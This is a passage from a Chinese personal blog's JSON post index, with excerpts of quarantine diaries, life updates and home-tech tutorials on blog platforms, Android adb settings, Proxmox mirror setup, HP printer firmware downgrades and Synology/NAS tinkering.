，如果好使，终于注册上账号，可以去下载耍耍了（对官网的依赖性重，其它途径下载来的总有点……）\n","link":"/my/624.html","date":"2022-12-11T05:25:00"},{"title":"市内一日游","content":"话说最近的天气也是个奇葩，7号立冬，按理说应该越来越冷，可它偏偏反着来，这不大周六的都上32度了，趁着这么好的天气想着带上一家人出去走走（碍于疫情没法出市，只能市内走走。本来想着往南走走，去去没到过的地方打打卡，一看地图好远呀，来回都超100公里了，家里人都想去就那出发吧！\n\n\n天气油炎热，一路都是开着冷空调进去的（没想到还能在冬天凉爽一把），山路弯弯绕，对于我这个老新手（山路开的不多）还是有一点点难度的，上午快10点出发，本来计划中午到举村乡吃中饭的，可结果开到 王莲坑口 这个地方，老爷发话说不去了，要去传说中的天路看看风景，可是度娘、高德了好一会也没看到有天路这个地方，正抓瞎的时候碰到了当地人，让我们直接在 王莲坑口 左转沿着路往前开就到了（右转是去举村），果不其然一路开，一路弯还真找到了，山高风景确实不错！\n\n\n别说，小湖南这一带的景色确实是平日在城市里看不到，就是山顶上实在是热，拍了些风景照和家人合影，就赶紧跑了，接着一路开，一路看\n","link":"/my/623.html","date":"2022-11-13T02:27:00"},{"title":"兜兜转转又回到Ghost","content":"博客已经长草好久了，虽然中间有很多次都想啰嗦一下，可到最后都…………。虽然博客内容没怎么更新，但折腾还是常用的，倒腾个主题、平台啥的——算是瞎折腾吧，把最主要的事——内容扔到脑后，，没办法这就是我。我的博客用过Wordpress，Typecho，Ghost等，虽然比较会折腾，但其实我也就只会抄抄写写，深层次的只能摊手了。\n\n\n之所以这次又回到Ghost，那是因为骨子里的那股欣赏吧，我是从0.7.4中文版本（当时国内的汉化版本）开始用起的，后面因为一些原因又辗转到Wordpress，Typecho。这次回来除了正常部署外，还把图片从本地改成又拍云托管，同时取消了评论（具体什么时候恢复评论到时再看吧，至少短时间内不会有），下面就把折腾中碰到的一些问题记录一下。\n又拍云的Ghost插件用的是这家的：https://github.com/leoskey/ghost-upyun-store ，但是部署我是按另外一个办法，这家给的办法我试了老是报错，可能是我哪里没弄好吧。\n\n通过 Git\n在Ghost目录下的 content 在命名中创建一个新文件夹 adapters/storage \n克隆到 s","link":"/it/622.html","date":"2022-10-23T05:31:00"},{"title":"隔离日志之第五天","content":"很快，已经第五天了，没什么意外的话下午就可以离开了（虽然这是那晚就知道的答案，但还是有点难受）。如往日一般，早上采核酸，不一样的是今天是双采（鼻子要捅两个，还有环境检测），依旧是吃完早饭等中饭的日子……\n\n中午1点多钟，第1个核酸结果出来了（当然是阴性了），而后又过了半个多小时，第2个核酸结果也出来，还是一样的阴性，然后就可以焦虑的等待……。后来实在是等不住了就打电话给前后，告之还要等环境检测结果出来，没意外的话下午就可以出去，并且健康码也会变码（大绿色），所以接下来的事仍旧是：等。\n大约等到快4点钟，电话来了，说是可以准备好东西下楼前往一楼前后签字走人，挂完电话心里那是一个美，就犹如刑满释放一般。到了一楼时，签了3个大名，一张留底，两张给我自己（其实是一张给街道、社区或村委，另一张给自己），这时再看自己的健康码时，已是原来那般让人喜爱的大绿色。背上行囊，快步回家，这是目前唯一想做的事，也是最开心的事。\n虽然这次酒店隔离比较突然，时间也不算长（相比而言，应该不算长的），但这也提醒在日常生活中应该做好防护，不该去的地方不去，哪怕是为了自己身边的人，该听话时还是需要听话的。\n","link":"/my/621.html","date":"2022-04-10T06:22:00"},{"title":"隔离日志之第四天","content":"日子过的很快，入住酒店第四天了，待的久了，感觉就有点麻了，缺少那点新鲜感，有的就只剩下满满的期待了。一天下来，三餐伙食还是不错的，真所谓有吃有喝，晚饭相比平常还加了一盒牛奶（原来的酸奶仍旧有），难怪有同事说这伙食比家里还好。\n\n由于身处酒店，所以一日下来也没啥事，无非早上采核酸（今天比昨天晚了，7点多才来采，捅的也还算好），下午也一样测个温，再刷个剧，接个电话搞个远程，一天就快就过去了，虽有些枯燥，但也还算好。不过有个好消息还是值得庆祝的，那就是按之前疾控给的“约定”，明天做完双采（两个鼻孔都采），结果仍旧是“阴性”的话就可以放出去了。虽然这是特好消息，但心里仍旧有一丝不安，因为目前健康码还是红的（那晚接了疾控的电话，报信息一上报，色立马就从绿色变成大家都不喜欢的红色），现在就是希望明天双采结果出来后，这健康码能变回到大绿色（说实话，从来都没有像现在这样渴望绿色）\n希望明天一切如愿，希望疫情早日离去！\n","link":"/my/620.html","date":"2022-04-09T05:02:05"},{"title":"隔离日志之第三天","content":"第三天了，日子过的还真快，早上依旧起的很早（没办法，翻来覆去的还是没睡踏实），正在WC享受之时，房门外开始播放通知，开始采核酸了（真是早呀，这才6点多一点），赶紧收拾好按要求带好口罩，准备好健康码等在门边上，没多久大白就来了，不得不说今天这小鼻子捅的比昨天舒服（昨天捅的太深了，而且旋转的幅度也大），采好核酸关好门，开始洗漱迎接新的一天。\n\n依旧是洗漱后再洗了个澡（早上洗澡还是蛮舒服的，贪一下酒店的便宜哈），然后就收拾一下，看看手机和笔记本，就等着早餐送上门了。前两天都晒了餐食，今天就不晒了，反正伙食还是不错的，必须点赞！可能是由于隔离的情况，今天一天的工作都不算太忙，抽空还可以刷个剧，玩个手游啥的，当然还要小锻炼一下，这俯卧撑好久没做，几个一做就感觉肩膀酸的很（平时就缺少锻炼），循序而进，明天再加几个233。\n晚饭后跟昨天一样，参加一下钉钉视频会，汇报一下一天工作。值得开心的是，晚上家人出来溜湾（终于又可以遥望了），虽然进来没几天，但已经很渴望出去了，一天24小时待在同一个空间里，可能都会有同感吧。尤其是看到酒店微信群时有人说可以离开时，越发的羡慕，想想再过些许天我也可以在群里说：“各","link":"/my/619.html","date":"2022-04-08T04:35:00"},{"title":"隔离日志之第二天","content":"本以为一个人睡大床可以睡的很好，结果却是……，醒的那是一个早，好不容易撑到6点钟，起来之后洗漱完，看看还早，想想要不洗个澡吧，反正闲着也是闲着…………别说，洗个澡——的确有用，人也精神多了，可以开始一天的生活了（虽说是在酒店隔离，但该干的活还是要干的，还得干的比前更加认真）\n\n早餐送来的也蛮早，伙食也还行，就是少了我最喜欢的肉包子（将就吃，在这不能挑剔，待我出去了秤一下，应该能减个几克重量）\n\n其实早饭是在8点半多才吃进肚子的，在此之前又开了一场钉钉视频会，加上一些事宜安排，最后早饭就吃的比平常晚了至少一个小时（不容易吧）。吃好早饭，远程处理了一些事宜，10点不到大白们就来采核酸了，今天的鼻子捅的真是个认真（换人了吗？捅的不仅深，还旋转了几圈，那个酸爽程度比昨天还刺激，所以后来发现鼻子里的血块比昨天多了些，估计明天我会有点恐惧了）。好在中午的伙食不宵错，也能让我这小小的心灵上有一点点安慰。\n\n中午饭后休息了一下（所谓的休息就是躺在椅子上看电影），两点多钟来量了一下体温，一天的生活又开始“自主”了，当然自己工作的事情还是要做的（比上班时稍幸福的是：可以闲时看看电视），期间抽空把我的小米M","link":"/my/618.html","date":"2022-04-07T04:23:00"},{"title":"隔离日志之第一天","content":"想我所在城市刚从之前的一级响应降为二级，而后又降为三级，本以为可以过上些安生的日子了，谁料想在4号晚上（准确的说是5号凌晨）一个疾控的电话，彻底打破了，以至于接后电话后几乎没睡着一直到天亮。疾控来电就是告之我，我的同事在某一天高铁外市回来然后成了密接，然后在不知情的情况下上了两天班，然后我们同科室的就成了次密接，再然后就是我们都要实行7天隔离，还得去酒店！你说这算不算是晴天霹雳般，真叫一个爽！\n\n于是5号6点不到我就醒了（丫就没怎么睡着），洗漱完就在等电话（接我去酒店），一直等到10点多司机才来（在此之前，社区也是急急忙忙送来一套大白服，要求出门前必须全套穿好出门），本来是要送到远一点的酒店，可能是司机来晚了，那边住满了，后来给我送到了离我家最近的一家酒店（一家我经常饭后遛弯必经的酒店，天意？），心想也好，至少可以看到他们。最后所住房间也是异常的如愿（临街旁的房间，窗户一开就能瞅见）。入住后，由大白（护士小姐姐）先做核酸、量体温，那鼻子捅的真是一个酸爽！然后就是拿出手机扫了一下酒店群（“狱友”群），换下我这个假大白服，并按规定装好消毒放到门口（阿姨会收走）。由于进来时就不早了，稍微理理","link":"/my/614.html","date":"2022-04-06T04:36:00"},{"title":"别了，2021","content":"本站长草已不是一天两天了，曾经有多少次想去清理一下“杂草”，可惜总是因为那些人为造成的原因作罢，这不一晃一年都要过去了，可回首一看，一年了！也没写几篇，这就是当初“创办”博客的初衷？？应该不是吧，但……\n\n归根到底，还就是那个字：懒\n\n想想这一年，自己过的也是风风雨雨，很多拥有的没了，想得到或实现的几乎也没有，就如这疫情一般，总看不到什么好的……\n","link":"/my/610.html","date":"2021-12-23T21:55:00"},{"title":"安卓11/10.0/9.0/8.1/7.1.X/6.X WiFi和信号出现叉X号或者感叹号的消除办法-Pixel 5和Nexus设备","content":"20210509 更新：在安卓 11/10.0/9.0/8.1/8.0/7.1.2 里如何消除 x 号（在老一点点版本是感叹号）呢？\n1.首先开启 usb 调试，然后用数据线连接电脑和手机。\n2.然后解决好您的 adb 驱动问题，具体教程见：https://www.uso.cn/post/view/1084\n3.在电脑开始菜单-运行 输入 cmd，打开命令提示符\n\n依次输入下面语句\n(以下办法支持安卓 11)\nadb shell settings put global captive_portal_mode 0\n\nadb shell settings put global captive_portal_https_url https://www.google.cn/generate_204\n\n(以下办法支持安卓 10.0/9.0/8.1/8.0/7.1.2/7.1.1)\nadb shell settings put global captive_portal_https_url https://www.google.cn/generate_204\n\n然后开启飞行模式，然后关闭飞行模式解","link":"/it/608.html","date":"2021-05-17T20:45:00"},{"title":"Ghost升级4.X后取消首页Subscribe","content":"回归 Ghost 有一小段日子了，现在用 Docker 部署感觉非常方便（想想以前搭建各种环境啥的，那是一个累），当然 Docker 部署在日常使用中也碰到一些问题，有些已经解决了（比如首页默认显示 localhost:2368 等），有些还在摸索解决中，谁叫俺学艺不精呢。\n\n因为之前用过 Ghost，所以都有备份，搭建好之后只要在实验室中导入即可，之前用的是 3.9 的版本，这次升级到 4.2 之后，发现首页右下角老是都是显示“Subscribe&quot;,甚是不爽，如下图：\n\n百度一番果然有解决方法，在 settings 中的 Code injection添加一段 css 代码屏蔽了即可，具体如下：\n\n&lt;style&gt;\n#ghost-portal-root {\n  display: none;\n}\n.nav-login, .nav-subscribe {\n    display: none;\n  }\n&lt;/style&gt;\n\n保存后，再刷新看一下，就可以发现首页右下角的Subscribe不见了，当然也就看着舒服了。\n本文部分内容来自：https://www.bil","link":"/it/607.html","date":"2021-04-18T20:44:00"},{"title":"Docker Ghost修改默认首页地址localhost:2368","content":"兜兜转转，晃一晃俺们又从 Typecho 转回 Ghost 了，倒不是 Typecho 不好，只是还是挺喜欢 Ghost 的风格，要是 Ghost 出个中文版的就好了（英文水平太 Low 了，没办法）。现在部署 Ghost 也比较简单，想省力可以直接 Docker 一下，分分钟就可以把 Ghost 搭建好，不过方便是方便，就是要修改 Ghost 配置、添加个啥的有点麻烦（我也还是个 Docker 新手，还有太多的不会），下面就来说说修改默认首页地址。\n\n这里以群晖 Docer 来演示，不会的时候也折腾了我许久，不把默认首页地址（也就是：localhost:2368）修改的话，很多链接调用就会出错，比如上传的图片等。群晖的 Docker 修改比较简单，直接在环境变量口中添加即可，如图：\n\n添加好之后记得重启一下容器，登陆后台随便上传个图片看看，就可以看到图片可以正常显示了。\n","link":"/it/606.html","date":"2021-04-18T20:43:00"},{"title":"惠普打印机M254dw、M254dn降级固件 解决升级后兼容硒鼓不能用的问题","content":"近期有部分用户反馈，由于打印机固件自动升级（升级后打印机固件代码号为20201021）使市面上一些使用兼容硒鼓不能识别，导致打印机报错“耗材有问题”。\n\n惠普彩色激光打印机的墨粉实在是太贵了！！！\n解决办法：对打印机做降级处理，将固件降级到_20200612版\n先在打印设置里打开“允许降级”\n1.点设置\n2.选服务\n3.点击打印机“Laser Jet 更新”→“管理更新”→“允许降级”→“是”。\n4.下载我发的附件。打开固件包，选择对应打印机型，点发送固件，5 分钟左右固件降级成功，问题解决了。\n最后一定注意要关闭打印机的自动更新\n1.找到打印机显示屏，点击“设置 ”。\n2.点击“服务”→“Laser Jet 更新” →“管理更新”→ 点击“允许更新 ”，设置为“否”。\n3.返回到“管理更新”界面，点击“自动检查”→ 将“自动检查”设置为“关”。\n看在找降级固件不易的份上，高抬贵手给个评分吧，谢谢各位！\nM254dw:\nhttps://wws.lanzous.com/iN6AKm1ty6h      密码:c21q\n\nM254dn_nw:\nhttps://wws.lanzous.com","link":"/it/605.html","date":"2021-03-25T20:43:00"},{"title":"Proxmox VE 6.1升级6.3设置国内源","content":"Proxmox VE 以下简称 PVE，相信折腾 All in one 或黑群晖、软路由，或多或少会有接触，作为底层平台各项功能还是不错，不过毕竟是老外的东西，在国内使用还是还会碰到一些问题，比如版本升级，下面就以我自己个人升级作一个简单教程（方便自己哪天忘了好查看），以下教程为网络整理所得，但经本人测试升级成功。\n\n\n删除企业源\n\nrm -rf /etc/apt/sources.list.d/pve-enterprise.list\n\n\n下载秘钥\n\nwget http://mirrors.ustc.edu.cn/proxmox/debian/proxmox-ve-release-6.x.gpg -O /etc/apt/trusted.gpg.d/proxmox-ve-release-6.x.gpg\n\n\n添加国内源\n\necho \"deb http://mirrors.ustc.edu.cn/proxmox/debian/pve buster pve-no-subscription\" &gt;/etc/apt/sources.list.d/pve-install-repo.list\n\n这里","link":"/it/604.html","date":"2021-03-24T20:42:15"},{"title":"是时候结束了","content":"本站在腾讯云（又称良心云）免费快 3 年了（当年送的 2K 优惠券买的主机），这不明年 1 月份就要到期了，没啥意外的话就不在续费了，那么意味着这个域名访问也将进入倒计时状态。2020 年来博客更新越发变得懒而少，或许有家庭原因，但还是自己太懒，加上博客自成立以来也没啥收入，之所以能折腾这么多年也全是自己的个人所好而已，既然现在…………，那就索性 Close 吧。\n\n本来昨天想着利用双十一 2.5 折续费优惠，再加上代理商的 8 折，实际也就付个 7 百左右，就可以再跑上 3 年了，但想想这近一年来的“所作所为”，加上目前的各种生活压力等等，最终还是把鼠标指针从支付按钮上挪开了。不过虽然这个 HK 主机不续费了，但博客还是会继续经营下去的，老域名uu126.cn依旧在线（基于 Hexo，托管在双拍云上），只是更新会慢一点，究其原因竟然是重装系统后，本地 Hexo 配置起来老是报错，等有空了再去研究一下（印象中以前 Hexo 挺好配的，莫不是我真的糊涂了？），还有一个域名：blog.uu126.cn，是同步这个网站的，同样的程序搭建，当然不保证哪天会不会换程序，但这个域名能访问 233\n","link":"/my/603.html","date":"2020-12-01T20:41:33"},{"title":"修复群晖Moments1.3.X套件主题、人物识别不能使用问题","content":"最近碰到自己家的黑群晖（DS918+）新装的 Moments 存在无法智能识别人物和主题分类等功能，如果你的黑群晖系统是 6.2.2 以下的系统，可以直接点击下载 Moments1.2 旧版本解决问题。6.2.3 系统无法安装 1.2 版本的 Moments，会提示版本不兼容，下面我们就来修复 1.3Moments 套件智能识别的问题。\n\n修复原理：将 Moments1.2 版本的 libsynophoto-plugin-detection.so 文件替换到 Moments1.3 版本中使用。\n\n停止 Moments 套件，群晖控制面板-终端机和 SNMP-启用 SSH 功能。\n通过 SSH 登录群晖，我使用的是 WinSCP 结合 putty，登录 root 账号，6.2.2 切换 root 用户指令\n\n//管理员切换root用户\nsudo -i\n\n这里切换到 root 帐户会让你输入密码，就输入当前管理员密码（比如：admin 的密码）或有管理员权限的密码\n\n备份原文件（万一替换出问题了，还可以换回去）\n\ncd/var/packages/SynologyMoments/target","link":"/it/602.html","date":"2020-10-12T20:40:10"},{"title":"黑群晖显示真实CPU核心信息补丁","content":"使用黑群晖（这里以 DS918+ 为例）会发现一个问题，就是信息中心的 CPU 信息跟实物不吻合，对于强迫证的我们来说，这也是需要改正的，下面就来说说如何让它显示正确的 CPU 信息：\n\n\n首先下载补丁文件：到电脑上，解压出来得到一个文件夹 ch_cpuinfo，里面有一个“ch_cpuinfo”文件；\n然后将 ch_cpuinfo 文件夹上传到黑群晖的共享文件夹，如 docker 目录下；\n使用诸如 putty 等工具连接 SSH，并以 root 权限登录（可以先用 admin 账号登录，再使用sudo -i切换到 root 账号，提示输密码时直接输 admin 的密码），分别输入以下命令：\n\ncd /volume1/docker/ch_cpuinfo\n./ch_cpuinfo\n\n接着先选择数字1，再选择y。\n\n\n输完后就可以关闭 SSH 工具，退出当前群晖登录的用户，并且重新登录；\n重新登录到桌面以后，打开控制面板的信息中心，就可以显示实际硬件信息了。\n\n\n","link":"/it/601.html","date":"2020-05-06T20:38:31"},{"title":"黑群晖之猫盘折腾记","content":"想我在 IT 界混了也算有段时间了吧（适当时候要自吹一下），想想当年对什么新鲜事物都充满了好奇感，可现在呢，嗅觉越来越弱化了，以致于 NAS（Network Attached Storage：网络附属存储）虽听过，但却从未真正接触过，惭愧吧……。而提到 NAS 就不得不说群晖，虽早几年就知道这世上有黑白群晖一说（官方出厂的俗称白群晖，自己捣鼓的就是黑群晖），但苦于白群晖的价格，再加上懒癌，黑群晖也就没接触过，别笑哈……\n\n\n这不最近看到论坛上又多了一个黑群晖利器——猫盘（又一个矿难产物），起初价格很便宜，但随着各大神的不断努力，让这个矿难产品可以跑起 NAS（如：X3P、黑群晖）后，这价格就越来越贵，等到我再入手时都过百了，还好碰到Yufun同学要转手，赶紧接了过来，价格当然要比某鱼上便宜，他之前刷的是 X3P，那我当然要刷个黑群晖体验一下了，网上教程很多，一键工具也很多，这里简单介绍一下（这里以 X3P 的基础上刷黑群晖，如果是原版猫盘系统建议使用一键工具先刷到 X3P）：\n\n使用 phtty 工具连接 ssh，猫盘 x3p 的默认用户为：root 密码为：Etech12\n粘贴以下代","link":"/it/600.html","date":"2020-04-10T20:37:03"},{"title":"小米MIX 2s花了49元撸了电池和屏幕","content":"本人手中的小米MIX 2s是年前淘来的，用的也挺不错，只是碍于电池容量小用的时间就短，所以一天两充是免不了，看了一下电池寿命，估计也就在88%左右（升级到MIUI开发版，可以直接在拨号界面输入##6485##查看）\n\n\n大概看几个参数就能知道电池损耗情况了，如下图：\n\n本来想着再用段时间再换，赶巧3月小米又开启了安心服务月活动，旨在为手机及家电用户提供产品免费清洁、保养、消毒等服务。小米售后服务方面表示，手部细菌、语音飞沫、空气中的细菌等会附着在手机表面形成病菌，通过与人接触，存在较高的健康隐患，经常给手机消毒十分重要。正因如此，小米在安心月活动当中针对性推出免费清洁和消毒服务。此次针对手机产品还有免费贴膜及49 元换电池活动。其中，在3.11-3.17日期间服务升级，推出15款机型49元换电池活动，助力抗疫。具体包括小米8、小米8SE、小米8青春、小米8屏幕指纹版、小米8探索版;小米9、小米9SE、小米9pro 5G、小米9探索版;MIX2、MIX2S、MIX3和MAX 3、Redmi 6、Redmi 6A。\n\n赶紧电话联系售后，说是要预约，目前电池没货，待货到后再联系安装。等了几天","link":"/my/570.html","date":"2020-03-19T06:50:17"},{"title":"Hexo一键部署到阿里云OSS","content":"鉴于最近github从中国大陆访问网速较慢，而且现在国内阿里云oss、腾讯云对象储存等的开始支持将静态网站部署在上面，而且访问速度还可以，加上最近本博主又开始在折腾Hexo了，Hexo的好处是可以生成静态文件，这样就可以多个地方同时在线，比如Github、Coding、OSS等，目前本站已经部署在前面说的那个地方，今天顺便把阿里云的OSS也上了吧。另外像腾讯云的COS上部署也差不多，改天也可以再尝试一下。\n\n想部署在OSS上，还得满足如下几个条件（有点废话）：\n\n本地已经安装好了hexo(即可以通过http://localhost:4000可以访问)\n拥有阿里云账号（部署静态网站需要实名认证）和备案的域名\n\n本次废话教程将重点从第二部分开始，本地安装Hexo博客就不再多说了，网上类似的教程很多，貌似也不是很难\n\n在您的hexo项目目录下执行：\n\nnpm install hexo-deployer-ali-oss --save\n\n\n在Hexo项目配置文件_config.yml中添加如下部署配置：\n\ndeploy:\n  type: ali-oss\n  region: &lt;您的oss 区","link":"/it/569.html","date":"2020-03-19T06:21:45"},{"title":"为 Typecho的代码块添加Copy按钮","content":"由于目前我用的是Mirages主题，所以接下来的步骤也按这个主题来，当然主题不同，也只是改的地方不一样而已，相信这都不是事，要是真有事了欢迎留言哈。\n\n先将以下代码添加到主题header.php中的&lt;/head&gt;标签前，或前往控制台-设置外观-主题自定义扩展（考虑到以后更新主题能够更加偷懒，建议还是放到自定义扩展中，将它添加到自定义 HTML 元素拓展-标签: head 头部 (meta 元素后)。\n\n&lt;script&gt;\n    // 在代码块右上角添加复制按钮\n    document.addEventListener(&#039;DOMContentLoaded&#039;, initCodeCopyButton);\n    function initCodeCopyButton() {\n        function initCSS(callback) {\n            const css = `\n                .btn-code-copy {\n                    position: absolute;\n  ","link":"/it/567.html","date":"2020-03-04T05:01:21"},{"title":"Typecho 博客评论显示 UserAgent (UA)","content":"\n本篇文章纯搬运 左岸大佬 的教程，之所以搬运也是为了记录下过程，也便于以后时间长了还能再参考着折腾（没办法，文章写不出来多少，折腾这些东西无用的却是十分的来劲）废话不多说，赶紧码字+拷贝记录下来。\n\n\n\n\n\n\n\n由于目前我用的是Mirages主题，所以接下来也按这个主题来：\n\n\n\n\n将下面的样式表外链加入到/usr/themes/Mirages/component/header.php的head部分，当然也可通过主题设置界面添加，这里建议大伙把css中的图片下载到本地，以便将来…………。\n\n\n\n\n&lt;link rel=\"stylesheet\" href=\"//cdn.zrahh.com/css/comment-ua.css\"&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n将以下代码加入到/usr/themes/Mirages/function.php末尾\n\n\n\n\n// 获取浏览器信息\nfunction getBrowser($agent)\n{\n    if (preg_match('/MSIE\\s([^\\s|;]+)/i', $agent, $regs)) {\n        $output","link":"/it/565.html","date":"2020-03-04T04:50:08"},{"title":"复苏的2020","content":"用“复苏”来形容2020年的开工复产，应该不为过吧。因为新冠病毒疫情的影响，导致节后该开工的无法开工，该上学的还在等待，给社会造成了多大影响可想而知（虽然俺从初八就开始上班了），好在疫情得到了控制（确诊病例、治愈人数等都在住好的方面发展），很多地方也开始开工复产，当然相应的防护措施还是有的，就比如我大浙江的三码通行政策（绿码、黄码、红码），不管怎么说开工复产了，对单位（或政府）还是对个人都是有好处的，这个就不多扯了，就像FM93里说到的，看到路上车多了、人多了都有一种不一样的喜悦感，接下来所谓的一罩（口罩）难求应该会有所好转吧。\n\n还是聊会自个吧，瞎扯闲扯的也不好是吧233.话说疫情这段时间，因为路上车少人少，虽然冷清了点，但是也有一个好处，油耗降了，原来一箱油跑500多公里，这会竟然跑了600多公里，足足多了100公里，我能暗自高兴一把吧，不过随着这周一开工复产了，路上车多人也多了，估计这跑不了这么多公里数了，虽然会有点小失落，但是想想现在热闹了呀，不像之前那段时间前无车、后无车的，空的慌。\n年后第一次外卖订单不幸在昨天产生了，要不是因为疫情的影响，估计早就订了，不过现在虽然开工复产","link":"/my/552.html","date":"2020-02-21T05:02:44"},{"title":"最近的事@6","content":"\n最近因为新型冠状病毒肺炎带来的影响，能宅在家的基本都宅在家了，像我这种不能宅家要上班的没办法了，加上大衢州的管控措施越来越严格，譬如进出小区都要出入证（不论人或车），进出小区或单位都要量体温（戴口罩那都是必须的事），虽然麻烦但看着最近几天没有新增确诊，管控措施还是非常有用的。目前一般的单位都被要求2月10日复工，所以最近行车在路上也可以看到那不是一般的空，什么交通堵塞那都不存在的，估计下周一复工后路面状况会慢慢回到以前吧。\n\n\n\n\n\n因为最近严格的管控措施，所以最近觅食就显得有点……，除了在单位食堂就只能在家里吃了（能点的外卖不多，而且还不能进小区，得去小区门口自提，也就失去了点外卖的动力），从网上看到最近宅家族们的厨技也是渐长（确实难宅呀，长这么大也是头一回体会到啥叫躺在床上不出门也能为国做贡献233）。不过最近上班也倒不忙，很多时候还是蛮空的，算是半休半工作吧，上班了还能聊聊天（虽然隔着口罩），也好过于天天宅家——闷的慌。\n\n\n\n\n\n或许正是因为上班不忙的缘故，这不想着折腾一下这“一亩三分地”，因为win后缀域名无法备案，加上主机也是当时腾讯云送的券，换的HongKong主机，原","link":"/my/541.html","date":"2020-02-08T19:30:05"},{"title":"2020年的春节","content":"\n2020年（本来寓意挺好的，2020爱你爱你……）的春节，原以为会跟以往春节那样，结果是大大出乎意料，原本可以大团聚的日子（串门、聚会等），现在却因为新型冠状病毒肺炎的出现，一切都变了，变得被要求在家呆着，没事少出门，更没提聚会、拜年等，而且今年流行的已不在是红包，而是口罩，谁要是可以拿出一堆的口罩来，那他一定很……。\n\n\n\n\n\n疫情是越来越严重，我大浙江的颜色也越来越深了，全国也变成了彩色，深颜色的区域也越来越多了，现在人们看到颜色浅的地方估计都很开心吧（东部地区是不用想了，想颜色变浅还得再过段时间吧），这场突来其来的疫情，也把武汉这个名称推到了风口上，可以说谈其色变，各地也都把从这个地方归来或经过的人盯的紧紧的。就连春节假期也因此延期了（从小到大这还是头一回碰到，可却也没太多的喜悦感），大街上随处可见的冷清，原本一位难求的停车位，现在也可以随便停了（喜欢停哪就停哪），其它诸如饭店、水果店开门的也很少，小区、村庄等也开始进行管控（减少出入口，必经出入口也有人员巡查、测温等），所有的种种都让这2020年的春节过得有点不爽、无奈……\n\n\n\n\n\n我大浙江目前确诊的也有428例了（还好我不","link":"/my/528.html","date":"2020-01-30T23:21:14"},{"title":"“范”闲整个黑苹果","content":"\n“范”闲最近比较出名，当然我其实并不闲（真的吗？）这不赶上周末有点闲，要不给俺家台式机也整个黑苹果吃吃（平安果最近卖的这么贵的，穷人就整个黑的吃吃吧），家里的台机配置也不高（I5 +H61+12G），日常整个Win10啥的是够用了，谁叫俺不打游戏呢（显卡是N卡730），看到黑果小兵有做好的系统（远景的号登录不上了，其它的付费的地也懒的整），就下个试试吧\n\n\n\n\n\n用的是四叶草的引导，主题也是定制的（挺漂亮的），因为机型有点早了怕太新了跑不动就下个Mojave吧，下载地址：https://blog.daliansky.net/macOS-Mojave-10.14.6-18G87-Release-version-with-Clover-5033-original-image.html   ，具体的使用上面写的很详细我就不在啰嗦了，有些碰到问题的地方我说说（怕以后时间长了自己记不得还能翻翻）：\n\n\n双系统安装的话（比如Win10+Mac），记得要将硬盘改为GPT，MBR格式是不行的，已经是MBR格式的可以用Win10自带的命令转换，转换好之后将BIOS里的引导方式改为 UEFI only ","link":"/my/519.html","date":"2019-12-29T05:55:36"},{"title":"最近的事@5","content":"\n打开博客发现最近一次更新竟然是3个月前（现在都这么懒了吗？不敢想象呀），我是不是该上来啰嗦一下，发一发牢骚了233。\n\n\n\n\n\n外面是越来越冷了，早上起不来，晚上睡的晚，如此反复恶性循环，难道这就是冬天，这就是天冷了该有的表现，估计是吧，反正我是这么一回事。人越来越惰性，越来越……啥也不想，就想那么躺着，哪怕只是多躺几秒钟，这算是懒癌晚期的表现吧233。以前回家必开两样东西：电视和电脑，现在回家还是必开两样：电视和手机，以前没事老爱上博客唠叨唠叨，现在就爱拿手机刷刷头条，打打小游戏，人确实是变了（难怪我以前经常逛的博客现在要么少更新了，要么干脆打不开了，莫非大家都是晚期了…………），好在我这域名当时注册了十年，空间也还没到期，感谢当年鹅场送了我2K的优惠券，要不然我也可能打不开了，哈哈 。\n\n\n现在电脑开的少其实也是有原因的，以前寡人一个，回家了没事自然是电脑一开，然后一直开到睡觉，现在不一样了，不是寡人了，虽然来点啥事，都可以把开电脑这事扔到脑后，用电脑该干的活基本上班时也差不多了，回到家再开电脑又不玩游戏感觉就没啥用了，看电影啥的现在不是可以手机或投屏嘛，也比坐在电脑前看着爽呀，","link":"/my/515.html","date":"2019-12-08T17:58:43"},{"title":"iPhone快速开启或关闭VoiceOver（旁白）","content":"\niPhone的VoiceOver（现在叫旁白）对视力等障碍的朋友们还是非常好用的，但要是正常人不小心开启了，就会发现想关闭那不是一般的麻烦（都有想砸手机的冲突）。为了关闭这功能会去尝试登录--设置--辅助--旁白--关闭，看着流程不复杂，可实际操作起来那真是一个爽233。\n\n\n\n\n\n其实想要快速开启或关闭VoiceOver（旁白）功能，还是蛮简单的（知道时感觉就这是这么简单，不知道时我也折腾了许久），不啰嗦了，赶紧放出大招：\n\n\n快速按手机右侧的关机键三次即可开启或关闭VoiceOver（旁白）\n\n\niphoneX以上没有Home键的是这么操作的，有Home键的我试了没用，可能是我手上的6SP太古老（ios12）了吧，按Home键或开关键都没反应，不去深究了，反正俺也不用这功能（够懒吧）\n","link":"/it/504.html","date":"2019-09-04T03:31:35"},{"title":"懒懒的9102年","content":"\n发觉9102年是真的懒，而且还是非一般的懒，这不小小博客上次更新还是在一月份（我去…………），什么理由都不能像我这么懒的没药治了…………。木的治咯，，木的治咯，，咋活呀！\n\n\n\n\n\n趁着大中午的休息时间，赶紧水上一贴，算是对慵懒的这段时间来一个小小的自我批评吧，大多的自我总结就不写了（怕是也写不出啥，懒成习惯了……），今后抽抽身还是要来水一下，谁叫这是俺的小据点呢（说不是or say no的可以走了），俺的地盘俺们一定要做主的（真是废柴呀……）\n\n\n先来说说博客吧，懒的没药的人又把Ghost换成Typecho了，不是Ghost不好，也不是Typecho有多好（神马话233），只是这两者相比Wordpress还是要好一点点的，Wordpress俺是前台快了后台慢，作为小小小博客还是功能富余了点，所以经俺们懒懒的决定还是Typecho吧（之前也用过一段时间的，稍微熟悉那么一丢丢），主题目前用的是之前买的，非常不错值得推荐的一款主题。\n\n\n感觉写着写着发现有点困了，还是趴会吧，下午还要干活呢，先水到此，下次再水吧…………………………（懒癌是越来越严重了…………）。\n","link":"/my/484.html","date":"2019-08-08T20:42:50"},{"title":"最近的事@4","content":"\n一晃都已经9102年了（网上看到很多都把2019写成这样，我这算是跟风吧?），上一次更博还是2018年11月份，这间隔的不是一点半点呀，难怪小宇童鞋都来叫阵了（我看他就是闲的?几乎天天更新，反观我…………）。最近发生了很多事（一贯的套路用词……），那就慢慢说来吧。\n\n\n\n\n\n先从12月初说吧，一次交通意外让我这人生头一回栽了个大跟头，经过发现一个“真理”——这皮包铁（两轮小电驴）真的是斗不过铁包皮（小四轮）呀，万幸的是没有碰上（简要说一下大概：那天刚过红绿灯，看见前面路口一辆小车要拐弯，车停了一下让我本能的觉得这是在让我过去，在我没有任何减速的情况下，小车猛